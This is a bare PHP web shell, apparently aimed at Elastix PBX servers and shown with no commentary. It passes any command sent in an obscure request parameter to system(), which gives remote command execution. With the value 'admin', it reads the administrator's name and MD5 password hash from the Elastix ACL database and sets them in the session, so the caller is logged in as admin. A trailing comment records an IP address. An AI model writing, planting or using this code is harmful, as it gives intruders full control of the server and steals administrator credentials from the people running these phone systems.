CLI>
 <?php
 system($_REQUEST["9203f9d0abc4c1f"]);
 if ($_REQUEST["9203f9d0abc4c1f"] == "admin") {
 include_once "/var/www/html/libs/paloSantoDB.class.php";
 include_once "/var/www/html/libs/paloSantoACL.class.php";
 $pDB = new paloDB("sqlite3:////var/www/db/acl.db");
 $db = $pDB->fetchTable("SELECT name, md5_password,extension from acl_user WHERE id ='1'");
 session_name("elastixSession");
 session_start();
 $_SESSION['elastix_user'] = $db[0][0];
 $_SESSION['elastix_pass'] = $db[0][1];
 echo '<a href="/" >Ultimate-cure</a>';
 }
 ?> <!-- 101.250.108.143 -->
